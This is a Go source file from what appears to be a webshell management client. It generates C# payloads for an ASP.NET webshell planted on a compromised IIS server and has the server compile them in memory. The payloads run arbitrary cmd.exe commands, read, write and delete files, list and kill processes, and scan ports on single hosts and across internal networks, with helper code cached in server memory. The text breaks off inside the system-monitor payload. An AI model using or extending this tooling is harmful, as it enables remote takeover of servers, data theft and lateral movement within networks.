package shell

import (
	"context"
	"fmt"
	"sort"
	"strings"
)

// aspnetShell 实现 ASP.NET（C# / .NET Framework / IIS）靶机的连接类型。
//
// C# 没有内建的 eval，因此「代码执行」走 CodeDom：把提交给靶机的 C# 代码片段在运行时编译进
// 内存（shell_aspx_eval.aspx 用 CSharpCodeProvider 完成），等效于 PHP 的 @eval。这样一条连接
// 既能跑系统命令（Run 里用 cmd /c），也能做文件读写 / 系统 / 进程 / 端口等结构化采集（模块机制）。
//
// 与 PHP/ASP 一致，这里也把模块源码缓存进靶机（HttpContext.Current.Application，即 AppDomain
// 级内存字典）：首次调用某命名空间模块时经 modStore 把源码存入，之后每次只发极短的 wsh_mod 调用，
// 由靶机侧从缓存取已编译的 Type 直接 Invoke，不再重发源码、也不再重复 CodeDom 编译。
// 缓存载体用 Application（而非 Session）是因为 aspnet 一句话马无会话概念，且 Application 跨请求
// 共享、最简单。代价是缓存活在 AppDomain 内存里，IIS 应用池回收 / 改 web.config / 动 bin 会清空，
// 此时 CallModule 的自愈流程（BOOT_MISSING → 重装引导；MODULE_MISSING → 重存模块）会自动恢复。
// 因此 bootstrap / modStore / bootInstall / clearCall 不再是空操作，而是读写 Application 缓存的指令。
type aspnetShell struct{}

func newAspnet() Shell { return aspnetShell{} }

// Type 返回连接类型 ID。
func (a aspnetShell) Type() string { return TypeAspnet }

// aspnetUsings 是手写任意 C#（Code / 虚拟终端）时方便使用的常用命名空间集合。
const aspnetUsings = `using System;using System.IO;using System.Web;using System.Collections.Generic;using System.Net;using System.Net.Sockets;using System.Text;using System.Management;using System.Diagnostics;`

// aspnetClassBody 是 WshRunner 骨架主体：WshE 助手 + Run 方法头（以 R.Write( 结尾，等 start 标记填入）。
// WshE 做 JSON 字符串转义，供置于 Run 方法体内的模块/命令代码调用。
// 注：TCP 连通性探测（WshOpen）已下沉到 net 模块（WshMod_net，见 aspnetModuleHead），不随骨架重编。
const aspnetClassBody = `public class WshRunner{
public static string WshE(string s){if(s==null)return "\x22\x22";s=s.Replace("\\","\\\\");s=s.Replace("\"","\\\"");s=s.Replace("\r","\\r");s=s.Replace("\n","\\n");s=s.Replace("\t","\\t");return "\x22"+s+"\x22";}
public static void Run(){var R=HttpContext.Current.Response;R.Write(`

// aspnetClassHead 是热路径骨架：modCall / Run / clearCall / bootInstall / dispatchInstall / modStore
// 全部使用全限定名，唯一需要的是 System.Web（骨架里的 HttpContext.Current.Response）。
// 故只保留 using System.Web;，每次结构化请求省下其余 8 个 using（约 180 字节）。
const aspnetClassHead = "using System.Web;\n" + aspnetClassBody

// aspnetCodeHead 供手写任意 C#（Code / 虚拟终端）使用：带上常用命名空间，省去全限定名。
const aspnetCodeHead = aspnetUsings + "\n" + aspnetClassBody

// aspnetClassTail 闭合 Run 方法与类。
const aspnetClassTail = `);}}
`

// ---------- 服务端缓存：命名空间模块的可编译类（缓存进 Application） ----------

// aspnetModuleHead 是「命名空间模块」的 C# 类骨架：每个命名空间（fs/sys/proc/net）编译成一个
// 静态类 WshMod_<ns>，内含该命名空间下各方法的静态函数与类级助手 WshE/WshOpen。该类被编译后，
// 其 System.Type 存入 Application["wsh_mods"]，调用时直接 MethodInfo.Invoke，不再重发源码。
// 类内自带 WshE/WshOpen，使模块方法在独立的程序集里也能自包含（不依赖每次请求的 WshRunner 程序集）。
// %s 由 aspnetModuleSource 替换为命名空间名（fs/sys/proc/net）。
const aspnetModuleHead = `using System;using System.IO;using System.Web;using System.Collections.Generic;using System.Net;using System.Net.Sockets;using System.Text;using System.Management;using System.Diagnostics;
public static class WshMod_%s{
public static string WshE(string s){if(s==null)return "\x22\x22";s=s.Replace("\\","\\\\");s=s.Replace("\"","\\\"");s=s.Replace("\r","\\r");s=s.Replace("\n","\\n");s=s.Replace("\t","\\t");return "\x22"+s+"\x22";}
public static bool WshOpen(string h,int p){try{using(var c=new System.Net.Sockets.TcpClient()){var ar=c.BeginConnect(h,p,null,null);if(ar.AsyncWaitHandle.WaitOne(1500)){try{c.EndConnect(ar);return true;}catch(System.Exception){return false;}}}}catch(System.Exception){}return false;}
`

// aspnetModuleTail 闭合 WshMod_<ns> 类。
const aspnetModuleTail = `}`

// aspnetModuleMethod 是命名空间内单个方法（如 fs.list）的模板：方法直接接收 wsh_args 字典
// （由缓存机件 Dispatch 从键值交替的字符串数组组装）并取 R=Response，再执行模块体（__BODY__）。
// 拆包逻辑只在 Dispatch 一处，模块方法不再各自解析编码串。__METHOD__/__BODY__ 由 aspnetModuleSource 替换。
const aspnetModuleMethod = `public static void __METHOD__(Dictionary<string,string> wsh_args){var R=HttpContext.Current.Response;__BODY__}
`

// aspnetModuleSource 把 aspnetModules 注册表里某命名空间的全部方法拼成一个可独立编译的 C# 类源码。
// 例如 ns="fs" 会生成含 list/read/write/delete 四个静态方法的 WshMod_fs。返回的源码经 modStore
// 存入 Application["wsh_src"]，并在首次调用时编译、缓存其 Type 到 Application["wsh_mods"]。
func aspnetModuleSource(ns string) string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf(aspnetModuleHead, ns))
	for name, block := range aspnetModules {
		if !strings.HasPrefix(name, ns+".") {
			continue
		}
		method := name[len(ns)+1:]
		m := strings.ReplaceAll(aspnetModuleMethod, "__METHOD__", method)
		m = strings.ReplaceAll(m, "__BODY__", block)
		b.WriteString(m)
	}
	b.WriteString(aspnetModuleTail)
	return b.String()
}


// wrap 把一段 C# 语句（将置于 Run 方法体）包进完整可编译程序，并在首尾夹上随机标记（供 send 截取）。
// 返回 (payload, start, end)。
func (a aspnetShell) wrap(code string) (string, string, string) {
	start, end := marker(), marker()
	payload := aspnetClassHead + csStr(start) + ");\n" + code + "\nR.Write(" + csStr(end) + aspnetClassTail
	return payload, start, end
}

// wrapCode 与 wrap 相同，但使用带完整 using 的 aspnetCodeHead 骨架，便于手写任意 C# 省略全限定名。
func (a aspnetShell) wrapCode(code string) (string, string, string) {
	start, end := marker(), marker()
	payload := aspnetCodeHead + csStr(start) + ");\n" + code + "\nR.Write(" + csStr(end) + aspnetClassTail
	return payload, start, end
}

// Run 执行一条系统命令：编译运行一段 C#，用 cmd /c 跑命令并把 stdout+stderr 夹在标记间回显。
func (a aspnetShell) Run(ctx context.Context, o ExecOptions, cmd string) Result {
	cmd = strings.TrimSpace(cmd)
	var b strings.Builder
	b.WriteString("var __p=new System.Diagnostics.Process();__p.StartInfo.FileName=\"cmd.exe\";__p.StartInfo.Arguments=\"/c \"+")
	b.WriteString(csStr(cmd))
	b.WriteString(";__p.StartInfo.UseShellExecute=false;__p.StartInfo.RedirectStandardOutput=true;__p.StartInfo.RedirectStandardError=true;try{__p.StartInfo.StandardOutputEncoding=System.Text.Encoding.GetEncoding(936);__p.StartInfo.StandardErrorEncoding=System.Text.Encoding.GetEncoding(936);}catch(System.Exception __ce){}__p.Start();R.Write(__p.StandardOutput.ReadToEnd());R.Write(__p.StandardError.ReadToEnd());__p.WaitForExit();")
	payload, start, end := a.wrap(b.String())
	return send(ctx, o, payload, start, end)
}

// Code 提交一段 C# 代码到 ASP.NET 靶机执行（经 CodeDom 编译），用于文件管理等结构化能力。
// 代码输出被随机标记包裹，便于从响应中精确截取。
func (a aspnetShell) Code(ctx context.Context, o ExecOptions, code string) Result {
	payload, start, end := a.wrapCode(code)
	return send(ctx, o, payload, start, end)
}

// Probe 返回 Inspect 探测串：对 aspnet 而言是一段合法但无副作用的 C# 语句（编译必过，避免 IIS 500）。
func (a aspnetShell) Probe() string { return "int __probe=0;" }

// bootstrap 对 aspnet 不再每次发送：机件（含分发委托 wsh_dispatch）在 bootInstall 时一次性编译并
// 缓存进 Application["wsh_dispatch"]，由缓存的 WshShell.Dispatch 在每次调用时自行检查 wsh_boot
// （缺失则回 BOOT_MISSING）。此处返回空串，避免每请求重复固定字节。
func (a aspnetShell) bootstrap() string { return "" }

// modCall 返回调用某命名空间模块的极短指令：仅取缓存的分发委托并 DynamicInvoke 三个字面量
// （命名空间 / 方法 / 参数数组）。原 modCall 里「读 wsh_boot、取/编译模块、GetMethod、Invoke、
// 错误转义」的全部逻辑已收进缓存的 WshShell.Dispatch，故每请求只发这三行。
// 缓存键带 _pairs 后缀即「代际」：委托签名或模块方法模板一变就改键名，旧键取不到自然回
// BOOT_MISSING 触发重装——比额外存一个版本号更省（每请求零额外字节），也不会静默用旧委托。
// 若委托未装载（AppDomain 回收后、或代际更替），写 BOOT_MISSING 触发 CallModule 自愈重装。
func (a aspnetShell) modCall(name, argexpr string) string {
	ns, method := splitModule(name)
	return `var __d=(System.Delegate)HttpContext.Current.Application["wsh_dispatch_pairs"];
if(__d==null){R.Write("BOOT_MISSING");return;}
__d.DynamicInvoke(` + csStr(ns) + `,` + csStr(method) + `,` + argexpr + `);`
}

// encodeArgs 产出 C# 字符串数组字面量：键值交替排列，由缓存机件 Dispatch 组装成字典。
// 取代早先的 \x1e/\x1f 打包串——那种编码对值内容有隐含限制（不能含分隔符字节），
// 且形如 "dir\x001f." 可读性差；数组字面量由 csStr 逐项独立转义，任意字符串都能安全表达。
// 无参数时传 null（比 new string[]{} 省 9 字节），Dispatch 据此建空字典。
func (a aspnetShell) encodeArgs(args map[string]any) string {
	if len(args) == 0 {
		return "null"
	}
	keys := make([]string, 0, len(args))
	for k := range args {
		keys = append(keys, k)
	}
	sort.Strings(keys) // 稳定顺序，便于调试（非必须）
	var b strings.Builder
	b.WriteString("new string[]{")
	for i, k := range keys {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(csStr(k) + "," + csStr(toStr(args[k])))
	}
	b.WriteString("}")
	return b.String()
}

// modStore 把命名空间模块的 C# 源码以字符串字面量直接内联存入 Application["wsh_src"]，
// 不经 base64 编码（asp.net 靶机侧用 C# 字面量即可解析，少一次编解码、更省带宽）；
// 真正编译并缓存 Type 的动作延迟到首次 modCall（避免每次 modStore 都起一次 CodeDom 编译）。
func (a aspnetShell) modStore(name, src string) string {
	return `{
var __src=` + csStr(src) + `;
if(HttpContext.Current.Application["wsh_src"]==null)HttpContext.Current.Application["wsh_src"]=new System.Collections.Generic.Dictionary<string,string>();
((System.Collections.Generic.Dictionary<string,string>)HttpContext.Current.Application["wsh_src"])[` + csStr(name) + `]=__src;
if(HttpContext.Current.Application["wsh_mods"]==null)HttpContext.Current.Application["wsh_mods"]=new System.Collections.Generic.Dictionary<string,System.Type>();
R.Write("{\"ok\":true}");}`
}

// clearCall 清空 Application 中的模块源码/已编译 Type 与机件标志。
// 同时清旧代际键 wsh_dispatch（现役键是 wsh_dispatch_pairs），避免留下永生的陈旧委托。
func (a aspnetShell) clearCall() string {
	return `HttpContext.Current.Application["wsh_src"]=null;HttpContext.Current.Application["wsh_mods"]=null;HttpContext.Current.Application["wsh_boot"]=null;HttpContext.Current.Application["wsh_dispatch_pairs"]=null;HttpContext.Current.Application["wsh_dispatch"]=null;R.Write("{\"ok\":true}");`
}

// aspnetDispatchSrc 是一次性编译进靶机 Application 的「分发机件」：一个 WshShell 静态类，内含 WshE
// （错误转义）与 Dispatch(ns,m,arg)。Dispatch 把原 modCall 的全部逻辑（读 wsh_boot、取/编译 wsh_src
// 命名空间模块、GetMethod 后 Invoke、错误转义）收进缓存，故每请求只发一行委托调用，不再重复那段分发代码。
// WshDispatch 委托类型与其同程序集编译；分发类以 C# 字符串字面量直接内联并在 dispatchInstall 里编译后，
// 运行时用 GetType 取出该委托类型，CreateDelegate 包装 Dispatch 存入 wsh_dispatch（不能存 MethodInfo，否则
// modCall 里强转 Action 会 InvalidCastException；也不能在 dispatchInstall 里写 typeof(WshDispatch)，
// 因为那是另一个程序集，编译期找不到）。
const aspnetDispatchSrc = `using System;using System.Web;using System.Collections.Generic;using System.CodeDom.Compiler;using Microsoft.CSharp;
public delegate void WshDispatch(string ns,string m,string[] kv);
public static class WshShell{
public static string WshE(string s){if(s==null)return "\x22\x22";s=s.Replace("\\","\\\\");s=s.Replace("\"","\\\"");s=s.Replace("\r","\\r");s=s.Replace("\n","\\n");s=s.Replace("\t","\\t");return "\x22"+s+"\x22";}
public static void Dispatch(string ns,string m,string[] kv){
var App=HttpContext.Current.Application;
if(App["wsh_boot"]==null){HttpContext.Current.Response.Write("BOOT_MISSING");return;}
// 参数以键值交替的字符串数组传入，在此统一组装成字典后递给模块方法。
// 每项由 csStr 独立转义，故值可以是任意字符串（不再有 \x1e/\x1f 打包串的分隔符冲突）。
var wsh_args=new System.Collections.Generic.Dictionary<string,string>();
if(kv!=null){for(int __i=0;__i+1<kv.Length;__i+=2){var __k=kv[__i];if(__k!=null)wsh_args[__k]=kv[__i+1]==null?"":kv[__i+1];}}
var mods=(System.Collections.Generic.Dictionary<string,System.Type>)App["wsh_mods"];
if(mods==null){mods=new System.Collections.Generic.Dictionary<string,System.Type>();App["wsh_mods"]=mods;}
if(!mods.ContainsKey(ns)){
var srcs=(System.Collections.Generic.Dictionary<string,string>)App["wsh_src"];
if(srcs==null||!srcs.ContainsKey(ns)){HttpContext.Current.Response.Write("{\"ok\":false,\"error\":\"MODULE_MISSING:"+ns+"\"}");return;}
var cp=new CompilerParameters();cp.GenerateInMemory=true;cp.IncludeDebugInformation=false;cp.ReferencedAssemblies.Add("System.dll");cp.ReferencedAssemblies.Add("System.Web.dll");cp.ReferencedAssemblies.Add("System.Management.dll");cp.ReferencedAssemblies.Add("System.Data.dll");
using(var p=new CSharpCodeProvider()){var r=p.CompileAssemblyFromSource(cp,srcs[ns]);if(r.Errors.HasErrors){foreach(CompilerError e in r.Errors)HttpContext.Current.Response.Write("[CompileError] "+e.ToString());return;}var t=r.CompiledAssembly.GetType("WshMod_"+ns);if(t==null){HttpContext.Current.Response.Write("{\"ok\":false,\"error\":\"module class not found: WshMod_"+ns+"\"}");return;}mods[ns]=t;}}
var mi=mods[ns].GetMethod(m);
if(mi==null){HttpContext.Current.Response.Write("{\"ok\":false,\"error\":\"MODULE_MISSING:"+ns+"."+m+"\"}");return;}
try{mi.Invoke(null,new object[]{wsh_args});}
catch(System.Exception e){HttpContext.Current.Response.Write("{\"ok\":false,\"error\":"+WshE(e.Message)+"}");}
}
}`

// dispatchInstall 把 aspnetDispatchSrc 以 C# 字符串字面量直接内联并编译，将 WshShell.Dispatch 包装成
// WshDispatch 委托存入 Application["wsh_dispatch_pairs"]（键名的 _pairs 后缀即代际标记，见 modCall 注释）。
// asp.net 靶机侧用字面量即可，不经 base64 编解码。
// 编译失败只回 [DispatchCompileError] 而不阻断（bootInstall 末尾仍回 ok），由后续调用自愈。
func (a aspnetShell) dispatchInstall() string {
	return `{
var __src=` + csStr(aspnetDispatchSrc) + `;
var __cp=new System.CodeDom.Compiler.CompilerParameters();__cp.GenerateInMemory=true;__cp.IncludeDebugInformation=false;__cp.ReferencedAssemblies.Add("System.dll");__cp.ReferencedAssemblies.Add("System.Web.dll");__cp.ReferencedAssemblies.Add("System.Management.dll");__cp.ReferencedAssemblies.Add("System.Data.dll");
using(var __p=new Microsoft.CSharp.CSharpCodeProvider()){var __r=__p.CompileAssemblyFromSource(__cp,__src);if(__r.Errors.HasErrors){foreach(System.CodeDom.Compiler.CompilerError __e in __r.Errors)R.Write("[DispatchCompileError] "+__e.ToString());}else{var __t=__r.CompiledAssembly.GetType("WshShell");if(__t!=null){var __mi=__t.GetMethod("Dispatch");var __dt=__r.CompiledAssembly.GetType("WshDispatch");if(__mi!=null&&__dt!=null)HttpContext.Current.Application["wsh_dispatch_pairs"]=System.Delegate.CreateDelegate(__dt,__mi);}}}
}`
}

// bootInstall 一次性写入机件：重建源码字典与已编译字典（无条件重建——代际更替时旧字典里可能是
// 上一代签名的源码/Type，留着会让新 Dispatch 以字典调用旧方法而 ArgumentException），置 wsh_boot
// 标志，并编译缓存分发委托（经 dispatchInstall）。AppDomain 回收后缓存一并清空，故每次 BOOT_MISSING
// 自愈都会重装它。该指令以 base="" 调用（自带初始化），不依赖 bootstrap 前缀。
func (a aspnetShell) bootInstall() string {
	return `HttpContext.Current.Application["wsh_src"]=new System.Collections.Generic.Dictionary<string,string>();
HttpContext.Current.Application["wsh_mods"]=new System.Collections.Generic.Dictionary<string,System.Type>();
HttpContext.Current.Application["wsh_boot"]=true;
` + a.dispatchInstall() + `
R.Write("{\"ok\":true}");`
}

// csStr 生成 C# 常规字符串字面量：转义反斜杠、双引号与换行/制表，其余可打印字符（含中文）原样保留；
// 控制字符（含参数分隔符 \x1e / \x1f）转义为 \xXX 形式，避免把裸控制字节塞进 C# 源码。
func csStr(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString("\\\\")
		case '"':
			b.WriteString("\\\"")
		case '\n':
			b.WriteString("\\n")
		case '\r':
			b.WriteString("\\r")
		case '\t':
			b.WriteString("\\t")
		default:
			if r < 0x20 {
				// 必须用 4 位十六进制：C# 的 \x 转义贪心吞掉后续 1~4 个十六进制字符。
				// 若写成 2 位（如 \x1f），后面紧跟的十六进制数字会被并吞（\x1f1 → U+01F1），
				// 导致含分隔符 \x1e/\x1f 的参数（host/ports 等紧跟数字）在运行时分隔符丢失，
				// 模块侧 wsh_args 解析不出键值对。4 位定长（\x001f）可杜绝此问题。
				fmt.Fprintf(&b, "\\x%04x", r)
			} else {
				b.WriteRune(r)
			}
		}
	}
	b.WriteByte('"')
	return b.String()
}

// ---------- 结构化能力：返回靶机侧 C# 代码字符串 ----------

// PortScan 对单台主机做 TCP 端口探测：aspnet 类型的实际实现走服务端缓存的 net 模块
// （WshMod_net 编译一次后缓存，逐端口只 Invoke 缓存 Type），故此处直接产出调用 net.scan
// 模块的指令——与 shell.go 的 CallModule("net.scan", ...) 等价。模块的编译/缓存与
// BOOT_MISSING 自愈由 CallModule 负责，本方法只负责"产出要提交的代码字符串"（接口要求）。
// 注：早先此处是一段直接塞进 WshRunner 骨架、用 WshOpen 试连的 C#（aspnetPortScan），
// 但 aspnet 的扫描早已统一走 net 模块，那段代码对 aspnet 类型从未被调用，属死代码，已删除。
func (a aspnetShell) PortScan(host string, ports string) (string, error) {
	return a.modCall("net.scan", a.encodeArgs(map[string]any{"host": host, "ports": ports})), nil
}

// HostScan 对内网多台主机做 TCP 端口扫描：同上，走缓存的 net.hostscan 模块
// （存活探测 + 端口扫描，hosts/ports/probe 经 encodeArgsPacked 编码为模块可解析的键值串）。
func (a aspnetShell) HostScan(hosts string, ports string, probe string) (string, error) {
	return a.modCall("net.hostscan", encodeArgsPacked(map[string]any{"hosts": hosts, "ports": ports, "probe": probe})), nil
}

// ---------- ASP.NET 模块源码（靶机侧实际执行的 C# 语句块，置于 Run 方法体内） ----------

// aspnetModules 按 "命名空间.方法" 注册各结构化能力的 C# 实现。modCall 据此内联发出，
// 字段命名与 php-eval 模块保持一致（fs/sys/proc/net），前端渲染无需改动。
var aspnetModules = map[string]string{
	// 文件管理：fs.list / fs.read / fs.write / fs.delete
	"fs.list": `var __dir=wsh_args.ContainsKey("dir")?wsh_args["dir"]:"";
if(__dir=="")__dir=".";
var __di=new System.IO.DirectoryInfo(__dir);
if(!__di.Exists){R.Write("{\"ok\":false,\"error\":"+WshE("不是目录: "+__dir)+"}");}
else{var __entries="";foreach(var __f in __di.GetFiles()){__entries+="{\"name\":"+WshE(__f.Name)+",\"path\":"+WshE(__f.FullName)+",\"isDir\":false,\"size\":"+__f.Length+",\"mode\":\"\"},";}foreach(var __d in __di.GetDirectories()){__entries+="{\"name\":"+WshE(__d.Name)+",\"path\":"+WshE(__d.FullName)+",\"isDir\":true,\"size\":0,\"mode\":\"\"},";}if(__entries!="")__entries=__entries.Substring(0,__entries.Length-1);R.Write("{\"ok\":true,\"dir\":"+WshE(__di.FullName)+",\"entries\":["+__entries+"]}");}`,

	"fs.read": `var __path=wsh_args.ContainsKey("path")?wsh_args["path"]:"";
if(!System.IO.File.Exists(__path)){R.Write("{\"ok\":false,\"error\":"+WshE("不是文件: "+__path)+"}");}
else{var __bytes=System.IO.File.ReadAllBytes(__path);R.Write("{\"ok\":true,\"name\":"+WshE(System.IO.Path.GetFileName(__path))+",\"size\":"+__bytes.Length+",\"base64\":"+WshE(System.Convert.ToBase64String(__bytes))+"}");}`,

	"fs.write": `var __path=wsh_args.ContainsKey("path")?wsh_args["path"]:"";var __b64=wsh_args.ContainsKey("b64")?wsh_args["b64"]:"";var __data=System.Convert.FromBase64String(__b64);System.IO.File.WriteAllBytes(__path,__data);R.Write("{\"ok\":true,\"bytes\":"+__data.Length+"}");`,

	"fs.delete": `var __path=wsh_args.ContainsKey("path")?wsh_args["path"]:"";bool __ok=false;string __err="";
try{if(System.IO.Directory.Exists(__path)){System.IO.Directory.Delete(__path,true);__ok=true;}else if(System.IO.File.Exists(__path)){System.IO.File.Delete(__path);__ok=true;}else{__err="路径不存在";}}catch(System.Exception __e){__err=__e.Message;}
R.Write("{\"ok\":"+(__ok?"true":"false")+",\"error\":"+WshE(__err)+"}");`,

	// 系统信息：sys.monitor（WMI 采集，全防御）/ sys.env（.NET 环境能力）
	"sys.monitor": aspnetMonitor,
	"sys.env":    aspnetEnv,

	// 进程：proc.list / proc.kill
	"proc.list": `string __procs="";try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process").Get()){string __pid=__o["ProcessId"]==null?"":__o["ProcessId"].ToString();string __ppid=__o["ParentProcessId"]==null?"":__o["ParentProcessId"].ToString();string __cmd=__o["Name"]==null?"":__o["Name"].ToString();if(__o["CommandLine"]!=null){string __cl=__o["CommandLine"].ToString();if(__cl!="")__cmd=__cl;}double __ws=0;if(__o["WorkingSetSize"]!=null)double.TryParse(__o["WorkingSetSize"].ToString(),out __ws);double __mtot=0;try{foreach(var __mm in new System.Management.ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem").Get()){double __tv=0;if(__mm["TotalVisibleMemorySize"]!=null)double.TryParse(__mm["TotalVisibleMemorySize"].ToString(),out __tv);__mtot=__tv*1024;}}catch(System.Exception){}double __mp=0;if(__mtot>0)__mp=Math.Round(__ws/__mtot*100,1);__procs+="{\"pid\":"+__pid+",\"ppid\":"+__ppid+",\"user\":\"\",\"cpu\":0,\"mem\":"+__mp.ToString()+",\"cmd\":"+WshE(__cmd)+"},";}}catch(System.Exception __e){R.Write("{\"ok\":false,\"error\":"+WshE(__e.Message)+"}");}
if(__procs!="")__procs=__procs.Substring(0,__procs.Length-1);
R.Write("{\"ok\":true,\"procs\":["+__procs+"]}");`,

	"proc.kill": `string __pid=wsh_args.ContainsKey("pid")?wsh_args["pid"]:"";int __sig=15;if(wsh_args.ContainsKey("sig"))int.TryParse(wsh_args["sig"],out __sig);bool __ok=false;string __err="";
try{int __id=int.Parse(__pid);var __pr=System.Diagnostics.Process.GetProcessById(__id);if(__sig==9){__pr.Kill();}else{__pr.CloseMainWindow();}__ok=true;}catch(System.Exception __e){__err=__e.Message;}
R.Write("{\"ok\":"+(__ok?"true":"false")+",\"error\":"+WshE(__err)+"}");`,

	// 网络：net.ports（解析 netstat -ano 的 LISTENING 行）
	"net.ports": `string __out="";try{var __np=new System.Diagnostics.Process();__np.StartInfo.FileName="cmd.exe";__np.StartInfo.Arguments="/c netstat -ano";__np.StartInfo.UseShellExecute=false;__np.StartInfo.RedirectStandardOutput=true;try{__np.StartInfo.StandardOutputEncoding=System.Text.Encoding.GetEncoding(936);}catch(System.Exception __ce){}__np.Start();__out=__np.StandardOutput.ReadToEnd();__np.WaitForExit();}catch(System.Exception __e){R.Write("{\"ok\":false,\"error\":"+WshE(__e.Message)+"}");}
string[] __lines=__out.Split(new char[]{'\n','\r'},StringSplitOptions.RemoveEmptyEntries);string __ports="";
foreach(var __rl in __lines){var __l=__rl.Trim();if(__l==""||!__l.ToUpper().StartsWith("TCP"))continue;var __cols=__l.Split(new char[]{' '},StringSplitOptions.RemoveEmptyEntries);if(__cols.Length<4||__cols[3].ToUpper()!="LISTENING")continue;string __local=__cols[1];int __idx=__local.LastIndexOf(':');if(__idx<0)continue;string __addr=__local.Substring(0,__idx).Replace("[","").Replace("]","");string __proto=__addr.IndexOf(':')>=0?"tcp6":"tcp";string __port=__local.Substring(__idx+1);string __pid=__cols[__cols.Length-1];__ports+="{\"proto\":"+WshE(__proto)+",\"addr\":"+WshE(__addr)+",\"port\":"+__port+",\"inode\":\"\",\"pid\":"+WshE(__pid)+",\"comm\":\"\"},";}
if(__ports!="")__ports=__ports.Substring(0,__ports.Length-1);
R.Write("{\"ok\":true,\"ports\":["+__ports+"]}");`,

// 网络：net.scan（单主机 TCP 端口探测）。WshOpen/WshE 随 WshMod_net 编译一次后缓存，
// 逐端口请求只 Invoke 缓存 Type，不再每次重编 WshRunner 骨架。host/ports 从 wsh_args 读取。
"net.scan": `string __h=wsh_args.ContainsKey("host")?wsh_args["host"]:"";
string[] __ps=wsh_args.ContainsKey("ports")&&wsh_args["ports"]!=""?wsh_args["ports"].Split(','):new string[0];
var __res="";var __sw=System.Diagnostics.Stopwatch.StartNew();
foreach(var __p in __ps){var __pt=__p.Trim();if(__pt=="")continue;int __pn;if(!int.TryParse(__pt,out __pn))continue;bool __o=WshOpen(__h,__pn);__res+="{\"port\":"+__pn+",\"open\":"+(__o?"true":"false")+"},";}
if(__res!="")__res=__res.Substring(0,__res.Length-1);
R.Write("{\"ok\":true,\"host\":"+WshE(__h)+",\"ports\":["+__res+"],\"elapsed\":"+(__sw.Elapsed.TotalSeconds).ToString("F2")+",\"method\":\"dotnet\"}");`,

// 网络：net.hostscan（多主机存活探测 + 端口扫描）。probe 端口任一可连即视为在线，
// 在线主机再扫完整端口。hosts/ports/probe 均从 wsh_args 读取，WshOpen 复用缓存助手。
"net.hostscan": `string[] __hs=wsh_args.ContainsKey("hosts")&&wsh_args["hosts"]!=""?wsh_args["hosts"].Split('|'):new string[0];
string[] __ps=wsh_args.ContainsKey("ports")&&wsh_args["ports"]!=""?wsh_args["ports"].Split(','):new string[0];
string[] __pr=wsh_args.ContainsKey("probe")&&wsh_args["probe"]!=""?wsh_args["probe"].Split(','):new string[0];
var __hres="";var __sw=System.Diagnostics.Stopwatch.StartNew();
foreach(var __h in __hs){var __ht=__h.Trim();if(__ht=="")continue;bool __alive=false;foreach(var __pp in __pr){var __ppt=__pp.Trim();if(__ppt=="")continue;int __pn;if(!int.TryParse(__ppt,out __pn))continue;if(WshOpen(__ht,__pn)){__alive=true;break;}}var __ports="";if(__alive){foreach(var __p in __ps){var __pt=__p.Trim();if(__pt=="")continue;int __pn;if(!int.TryParse(__pt,out __pn))continue;bool __o=WshOpen(__ht,__pn);__ports+="{\"port\":"+__pn+",\"open\":"+(__o?"true":"false")+"},";}}if(__ports!="")__ports=__ports.Substring(0,__ports.Length-1);__hres+="{\"host\":"+WshE(__ht)+",\"alive\":"+(__alive?"true":"false")+",\"ports\":["+__ports+"]},";}
if(__hres!="")__hres=__hres.Substring(0,__hres.Length-1);
R.Write("{\"ok\":true,\"hosts\":["+__hres+"],\"elapsed\":"+(__sw.Elapsed.TotalSeconds).ToString("F2")+"}");`,
}

// aspnetMonitor 是系统资源概览采集（字段对齐 monitorPHP），全程 try/catch 防御，
// 任一数据源不可用时给空值/0 而非报错。含公网 IP 出网探测（WebClient）。
const aspnetMonitor = `string __host="";string __oscap="";string __model="";int __cores=0;double __pu=0;double __mt=0;double __mf=0;double __uptime=0;
try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT Name FROM Win32_ComputerSystem").Get()){__host=__o["Name"]==null?"":__o["Name"].ToString();}}catch(System.Exception){}
try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime FROM Win32_OperatingSystem").Get()){__oscap=__o["Caption"]==null?"":__o["Caption"].ToString();if(__o["TotalVisibleMemorySize"]!=null){double __t=0;double.TryParse(__o["TotalVisibleMemorySize"].ToString(),out __t);__mt=__t*1024;}if(__o["FreePhysicalMemory"]!=null){double __f=0;double.TryParse(__o["FreePhysicalMemory"].ToString(),out __f);__mf=__f*1024;}if(__o["LastBootUpTime"]!=null){string __lb=__o["LastBootUpTime"].ToString();if(__lb.Length>=14){try{int __y=int.Parse(__lb.Substring(0,4));int __mo=int.Parse(__lb.Substring(4,2));int __d=int.Parse(__lb.Substring(6,2));int __hh=int.Parse(__lb.Substring(8,2));int __mi=int.Parse(__lb.Substring(10,2));int __ss=int.Parse(__lb.Substring(12,2));DateTime __bt=new DateTime(__y,__mo,__d,__hh,__mi,__ss);__uptime=(DateTime.Now-__bt).TotalSeconds;}catch(System.Exception){}}}}}catch(System.Exception){}
try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT Name,NumberOfLogicalProcessors,NumberOfCores FROM Win32_Processor").Get()){__model=__o["Name"]==null?"":__o["Name"].ToString();int __n=0;if(__o["NumberOfLogicalProcessors"]!=null)int.TryParse(__o["NumberOfLogicalProcessors"].ToString(),out __n);if(__n<=0&&__o["NumberOfCores"]!=null)int.TryParse(__o["NumberOfCores"].ToString(),out __n);__cores+=__n;}if(__cores<=0)__cores=1;}catch(System.Exception){}
try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'").Get()){double __v=0;if(__o["PercentProcessorTime"]!=null)double.TryParse(__o["PercentProcessorTime"].ToString(),out __v);__pu=__v/100;}}catch(System.Exception){}
